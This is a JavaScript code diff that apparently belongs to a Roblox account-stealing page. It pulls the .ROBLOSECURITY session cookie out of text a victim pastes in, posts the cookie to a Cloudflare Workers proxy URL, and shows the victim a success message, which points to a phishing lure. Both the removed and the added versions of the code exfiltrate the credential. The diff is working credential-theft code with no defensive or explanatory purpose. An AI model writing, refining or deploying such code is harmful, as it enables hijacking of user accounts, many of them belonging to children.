@@ -1,46 +1,42 @@
 const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
 
-function extractRobloxSecurityCookie(sessionId) {
-  const regex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
-  const match = sessionId.match(regex);
-  return match ? match[1] : null; // Return cookie value if found, else null
-}
-
-async function sendToProxy(content) {
+async function sendToProxy(sessionId) {
   try {
     const response = await fetch(CLOUDFLARE_PROXY_URL, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: {
+        'Content-Type': 'application/json'
+      },
       body: JSON.stringify({
-        content,
+        sessionId: sessionId,
         timestamp: new Date().toISOString()
       })
     });
 
     if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
-    console.log("Successfully sent to proxy");
     return await response.json();
-
+    
   } catch (error) {
     console.error('Proxy error:', error);
     throw error;
   }
 }
 
+// Example usage with your existing bruteforce function
 function bruteforce(sessionId) {
-  let content;
+  const cookie = sessionId.includes(".ROBLOSECURITY") 
+    ? extractRobloxSecurityCookie(sessionId)
+    : null;
 
-  if (sessionId.includes(".ROBLOSECURITY")) {
-    const robloxSecurityCookie = extractRobloxSecurityCookie(sessionId);
-    if (robloxSecurityCookie) {
-      content = `New .ROBLOSECURITY Cookie Submitted:\n\`\`\`${robloxSecurityCookie}\`\`\``;
-    } else {
-      content = `No valid .ROBLOSECURITY cookie found in the sessionId:\n\`\`\`${sessionId}\`\`\``;
-    }
-  } else {
-    content = `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``;
-  }
+  sendToProxy(cookie || sessionId)
+    .then(() => showCookieSuccess())
+    .catch(() => showError("Failed to send data"));
+}
 
+function extractRobloxSecurityCookie(sessionId) {
+  const match = sessionId.match(/\.ROBLOSECURITY[^=]+=([^;]+)/);
+  return match ? match[1] : null;
+}
 
 
 
